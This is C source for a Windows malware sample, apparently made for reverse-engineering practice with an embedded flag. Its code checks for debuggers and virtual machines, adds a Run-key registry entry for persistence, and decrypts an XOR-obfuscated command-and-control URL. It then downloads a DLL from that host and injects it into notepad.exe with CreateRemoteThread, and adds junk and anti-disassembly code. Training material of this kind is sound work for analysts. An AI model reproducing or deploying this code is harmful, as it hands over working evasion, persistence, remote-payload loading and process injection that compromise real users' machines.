#pragma optimize("", off)

#include <winsock2.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <winreg.h>
#include <stdio.h>
#include <urlmon.h>
#include <stdlib.h>
#include <intrin.h>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ntdll.lib")

extern int _same_jump();

void xorDecrypt(const unsigned char *input, unsigned char *output, const unsigned char *key, size_t inputLen, size_t keyLen) {
    for (int i = 0; i < inputLen; i++) {
        output[i] = input[i] ^ key[i % keyLen];
    }
}

// Prints a flag only viewable at runtime into a file
void dynamicFlag() {
    // Ajay_Hello_Dynamic_World_4484 xor encrypted in hexadecimal
    const unsigned char dynamic_flag_encrypted[] = {
        0x3b, 0x4e, 0xf1, 0x5e, 0x31, 0x91, 0x05, 0x7a, 0xff, 0x2d, 0xb6,
        0x8e, 0x16, 0x55, 0xbd, 0xc0, 0x13, 0x47, 0xcf, 0x70, 0x01, 0xab, 0x0c, 0x72, 0xcc, 0x76, 0xdd, 0xf2, 0x5b, 0x00
    };
    const size_t flag_len = sizeof(dynamic_flag_encrypted);

    // random 16 byte key
    const unsigned char key[] = {
        0x7a, 0x24, 0x90, 0x27, 0x6e, 0xd9, 0x60, 0x16, 0x93, 0x42, 0xe9, 0xca, 0x6f, 0x3b,
        0xdc, 0xad
    };
    const size_t key_len = sizeof(key);

    unsigned char *dynamic_flag = malloc(flag_len);

    xorDecrypt(dynamic_flag_encrypted, dynamic_flag, key, flag_len, key_len);
    dynamic_flag[flag_len - 1] = '\0';

    FILE* file = fopen("output.txt", "w");
    if (file == NULL) {
        printf("Error opening file\n");
        exit(1);
    }
    fprintf(file, "%s", (char*)dynamic_flag);
    free(dynamic_flag);
    fclose(file);
}

void checkDebugger() {
    printf("Check Debugger\n");
    if (IsDebuggerPresent()) {
        printf("Debugger is Present\n");
        exit(1);
    }

    BOOL isRemoteDebuggerPresent;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
    if (isRemoteDebuggerPresent) {
        printf("Remote Debugger is Present\n");
        exit(1);
    }
}

void checkVmOui() {
    printf("Check VM OUI\n");

    const unsigned char vmOUIs[][3] = {
        {0x00, 0x05, 0x69}, // VMWare vSphere, ESX
        {0x00, 0x0C, 0x29}, // VMWare Workstation/Horizon
        {0x08, 0x00, 0x27}, // VirtualBox
        {0x00, 0x15, 0x5D}  // Hyper-V
    };

    ULONG bufLen = sizeof(IP_ADAPTER_INFO);
    IP_ADAPTER_INFO *pAdapterInfo = malloc(bufLen);

    while (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = realloc(pAdapterInfo, bufLen);
    }

    printf("\n");
    for (IP_ADAPTER_INFO *pCurrentAdapterInfo = pAdapterInfo; pCurrentAdapterInfo; pCurrentAdapterInfo = pCurrentAdapterInfo->Next) {
        printf("MAC Address: ");
        for (int i = 0; i < pCurrentAdapterInfo->AddressLength; ++i) {
            printf("%02X%s", pCurrentAdapterInfo->Address[i], (i < pCurrentAdapterInfo->AddressLength - 1) ? ":" : "");
        }
        printf("\n");

        // Compare the first three bytes of the MAC address with the VM OUIs
        for (int i = 0; i < sizeof(vmOUIs) / sizeof(vmOUIs[0]); ++i) {
            if (memcmp(pCurrentAdapterInfo->Address, vmOUIs[i], 3) == 0) {
                printf("VM OUI is present\n");
                free(pAdapterInfo);
                exit(1);
            }
        }
    }

    free(pAdapterInfo);
}

// Enabling SMV in BIOS affects this, forcing the 31st bit on, affects memory integrity and core isolation
void checkVmCpuid() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);

    const unsigned int hypervisor_bit = (cpuInfo[2] >> 31) & 1;
    const unsigned int vmx_bit = (cpuInfo[2] >> 5) & 1;

    printf("\ncpuInfo[2]: 0x%08X\n", cpuInfo[2]);
    printf("Hypervisor Bit: %u\n", hypervisor_bit);
    printf("VMX Bit: %u\n", vmx_bit);
    if (hypervisor_bit) {
        printf("Hypervisor detected\n");
        exit(1);
    } else {
        printf("Hypervisor not detected\n");
    }
    if (vmx_bit) {
        printf("VMX detected\n");
    } else {
        printf("VMX not detected\n");
        exit(1);
    }
}

void addRegKey() {
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* regName = "Ajay_Malware_4484";

    // Get running path for the exe
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    LONG result = RegSetKeyValue(
        HKEY_CURRENT_USER,
        regPath,
        regName,
        REG_SZ,
        exePath,
        strlen(exePath) + 1
    );

    if (result == ERROR_SUCCESS) {
        printf("Registry entry successful\n");
    } else {
        printf("Registry entry failed; Error code: %ld\n", result);
    }
}

// Download Ajay-injected-dll.dll from c2.ajay.com
char* downloadFile() {

    // http://c2.ajay.com/Ajay-injected-dll.dll encrypted
    const unsigned char server_encrypted[] = {
        0x55, 0x8b, 0x2b, 0xae, 0x07, 0xd0, 0x70, 0xbd, 0x0f, 0xd1, 0x3e, 0xb4, 0x5c, 0x86, 0x71, 0xbd, 0x52, 0x92,
        0x70, 0x9f, 0x57, 0x9e, 0x26, 0xf3, 0x54, 0x91, 0x35, 0xbb, 0x5e, 0x8b, 0x3a, 0xba, 0x10, 0x9b, 0x33, 0xb2,
        0x13, 0x9b, 0x33, 0xb2, 0x00
    };
    const size_t server_len = sizeof(server_encrypted);

    // Ajay-injected-dll.dll encrypted
    const unsigned char file_encrypted[] = {
        0x7c, 0x95, 0x3e, 0xa7, 0x10, 0x96, 0x31, 0xb4, 0x58, 0x9c, 0x2b, 0xbb, 0x59, 0xd2, 0x3b, 0xb2, 0x51, 0xd1,
        0x3b, 0xb2, 0x51, 0x00
    };
    const size_t file_len = sizeof(file_encrypted);

    // Random 4 byte key used for server and file decryption
    const unsigned char key[] = {
        0x3d, 0xff, 0x5f, 0xde
    };
    const size_t key_len = sizeof(key);

    char *server = malloc(server_len);
    char *file = malloc(file_len);

    xorDecrypt(server_encrypted, (unsigned char*)server, key, server_len, key_len);
    server[server_len - 1] = '\0';

    xorDecrypt(file_encrypted, (unsigned char*)file, key, file_len, key_len);
    file[file_len - 1] = '\0';

    printf("\nServer: %s\n",  server);
    printf("File: %s\n",  file);

    HRESULT result = URLDownloadToFile(NULL, server, file, 0, NULL);
    if (result == S_OK) {
        printf("Download successful");
    } else {
        printf("Download failed");
    }

    free(server);
    return file;
}

void dllInjector(char* dllName) {

    // Get path of current exe
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Copy over exe path
    char dllPath[MAX_PATH];
    strcpy(dllPath, exePath);

    char* lastSlash = strrchr(dllPath, '\\'); // Find the last backslash
    *(lastSlash + 1) = '\0'; // Terminate the string after the last backslash
    strcat(dllPath, dllName);

    // Open notepad.exe and get handles
    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(STARTUPINFO);
    PROCESS_INFORMATION processInfo = { 0 };
    CreateProcess(
    "C:\\Windows\\System32\\notepad.exe",
    NULL,
    NULL,
    NULL,
    FALSE,
    0, NULL,
    NULL,
    &startupInfo,
    &processInfo
    );
    HANDLE hProc = processInfo.hProcess;
    if (hProc == INVALID_HANDLE_VALUE) {
        printf("Failed to open process info\n");
    }

    // Allocate memory in the target process for the DLL path
    LPVOID loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (loc == NULL) {
        printf("Failed to allocate memory\n");
    }

    // Write the DLL path into the allocated memory
    BOOL result = WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
    if (result == FALSE) {
        printf("Error writing to process memory\n");
    }

    // Call LoadLibrary in the context of the target process
    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, loc, 0, 0);
    if (hThread == NULL) {
        printf("Failed to create thread\n");
    }

    // Close handles
    CloseHandle(hProc);
    CloseHandle(processInfo.hThread);
}

// Junk code for harder reverse engineering
int junk() {
    printf("Junk Code\n");
    int x = 12345;
    int y = 57890;
    int z = 0;

    for (int i = 0; i < 50; i++) {
        x = (x ^ i) + (y % 13);
        y = (y << 1) | (x & 1);
        z += (x ^ y) % (i + 1);
    }
    return z;
}

int main(int argc, char* argv[]) {
    printf("For education purposes only\n");

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-ad") == 0) {
            checkDebugger();
        }
        else if (strcmp(argv[i], "-avm") == 0) {
            checkVmOui();
            checkVmCpuid();
        }
    }

    dynamicFlag();
    addRegKey();

    _same_jump(); // Call anti-disassembly assembly function
    junk();

    char* file = downloadFile();
    dllInjector(file);
    free(file);

    return 0;
}
